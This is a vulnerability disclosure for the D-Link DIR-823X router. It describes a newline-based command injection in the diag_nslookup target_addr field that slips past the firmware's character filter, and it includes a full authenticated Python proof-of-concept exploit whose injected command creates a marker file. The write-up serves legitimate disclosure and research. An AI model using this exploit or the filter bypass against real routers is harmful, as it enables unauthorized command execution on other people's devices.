# Dlink-dir-823x-diag_nslookup-target_addr-CommandInjection

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a  command injection vulnerability in the Dlink-dir-823x router.

By analyzing the webs file in the bin directory, I found that the function 0x41710c contains a command injection vulnerability.

The command injection can be triggered by the target_addr key value, which leads to a system command injection.

![image-20250218162900520](https://gitee.com/xyqer/pic/raw/master/202502181629600.png)

Through the above code, it can be found that there is a command injection, and the prerequisite is to pass the verification of sub_415088.

![image-20250218154601625](https://gitee.com/xyqer/pic/raw/master/202502191007455.png)

Go in and find that this part is a loop, and it is necessary to ensure that each character passes the sub_414FF8 verification.

![image-20250218154730716](https://gitee.com/xyqer/pic/raw/master/202502191008485.png)

In fact, left and right parentheses, left and right curly braces, single quotes, semicolons, and ` cannot appear. Therefore, we use \n for command injection.

## How can we simulate a router

﻿Use the following command to simulate with qemu-aarch64-static.

Note that before this, it is necessary to ensure that the var/run folder exists. If it does not exist, create it.

```bash
sudo chroot ./ ./qemu-aarch64-static -- ./usr/sbin/goahead -f
```

﻿The content of the **poc.py** file is as follows:

```python
import requests
import logging
import argparse
import re
import hmac
import hashlib


logging.basicConfig(level=logging.DEBUG)


def extract_cookies_from_response(response):
    cookies = response.headers.get('Set-Cookie', '')
    sessionid = re.search(r'sessionid=([^;]+)', cookies)
    token = re.search(r'token=([^;]+)', cookies)
    sessionid = sessionid.group(1) if sessionid else None
    token = token.group(1) if token else None
    return sessionid, token

def send_get_login_page(session, host_ip):
    url = f"http://{host_ip}/login.html"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    response = session.get(url, headers=headers)
    
    if response.status_code == 200:
        sessionid, token = extract_cookies_from_response(response)
        return sessionid, token
    else:
        logging.error("Failed to get login page.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")
        return None, None

def hash_password(password, token):
    hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
    url = f"http://{host_ip}/goform/login"
    
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "username": username,
        "password": hashed_password,
        "token": token
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    return response

def send_diag_nslookup_request(session, host_ip, sessionid, token):
    url = f"http://{host_ip}/goform/diag_nslookup"
    
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "target_addr": "\ntouch hack_diag_nslookup.txt\n",
        "token": token
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    return response

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.0.1', help='Host IP address.')
    parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')

    args = parser.parse_args()

    logging.info(f'Host IP: {args.host}')

    # Get login page
    sessionid, token = send_get_login_page(session, args.host)
    if sessionid and token:
        logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
        
        # Hash the password
        hashed_password = hash_password(args.password, token)
        
        # Send login request
        response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
        if response.status_code == 200:
            logging.info("Login request sent successfully.")
            logging.debug(f"Response: {response.text}")
            
            # Extract updated sessionid and token from login response
            sessionid, token = extract_cookies_from_response(response)
            
            # Send LAN settings request
            response = send_diag_nslookup_request(session, args.host, sessionid, token)
            if response.status_code == 200:
                logging.info("LAN settings request sent successfully.")
                logging.debug(f"Response: {response.text}")
            else:
                logging.error("Failed to send LAN settings request.")
                logging.error(f"Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        else:
            logging.error("Failed to send login request.")
            logging.error(f"Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    else:
        logging.error("Failed to retrieve sessionid and token from login page.")

if __name__ == "__main__":
    main()
```

## Attack result

![image-20250218163128217](https://gitee.com/xyqer/pic/raw/master/202502181631696.png)

It can be seen that the successful creation of hack_diag_nslookup.txt means the attack is successful.